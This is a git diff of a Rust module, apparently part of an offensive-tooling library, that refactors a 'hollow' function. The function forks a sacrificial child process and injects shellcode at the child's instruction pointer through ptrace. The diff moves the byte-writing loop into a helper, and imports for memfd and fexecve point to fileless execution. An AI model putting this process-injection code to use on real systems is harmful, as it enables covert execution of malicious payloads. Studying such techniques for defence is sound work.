@@ -1,17 +1,18 @@
 //! Techniques that spawn a new process.
 
-use std::ffi::{c_void, CString};
+use std::ffi::CString;
 use std::os::fd::AsRawFd;
 
 use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
 use nix::sys::ptrace;
-use nix::sys::wait::waitpid;
 use nix::unistd::{self, execve, fexecve, fork, ForkResult};
+
+use exeutils::elf64;
 
 use crate::error::{Error, Result};
 use crate::payload::{New, Payload, PayloadType};
+use crate::primitives::ptrace::ptace_write_rip;
 use crate::utils::{get_env, str_to_vec_c_string};
-use exeutils::elf64;
 
 /// Uses [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to inject shellcode into a sacrificial process.
 /// Only works with shellcode payloads.
@@ -46,29 +47,16 @@ use exeutils::elf64;
 /// ```
 pub fn hollow(payload: Payload<New>) -> Result<()> {
     match unsafe { fork() } {
-        Ok(ForkResult::Parent { child, .. }) => {
-            waitpid(child, None)?;
-
-            match payload.payload_type() {
-                PayloadType::Executable => {
-                    return Err(Error::NotImplemented(
-                        "hollow can not take executables".to_string(),
-                    ));
-                }
-                PayloadType::Shellcode => {
-                    let regs = ptrace::getregs(child)?;
-
-                    let mut addr = regs.rip;
-
-                    for byte in payload.bytes() {
-                        ptrace::write(child, addr as *mut c_void, i64::from(*byte))?;
-                        addr += 1;
-                    }
-
-                    ptrace::detach(child, None)?;
-                }
+        Ok(ForkResult::Parent { child, .. }) => match payload.payload_type() {
+            PayloadType::Executable => {
+                return Err(Error::NotImplemented(
+                    "hollow can not take executables".to_string(),
+                ));
             }
-        }
+            PayloadType::Shellcode => {
+                ptace_write_rip(child, payload.bytes(), true)?;
+            }
+        },
 
         Ok(ForkResult::Child) => {
             ptrace::traceme()?;
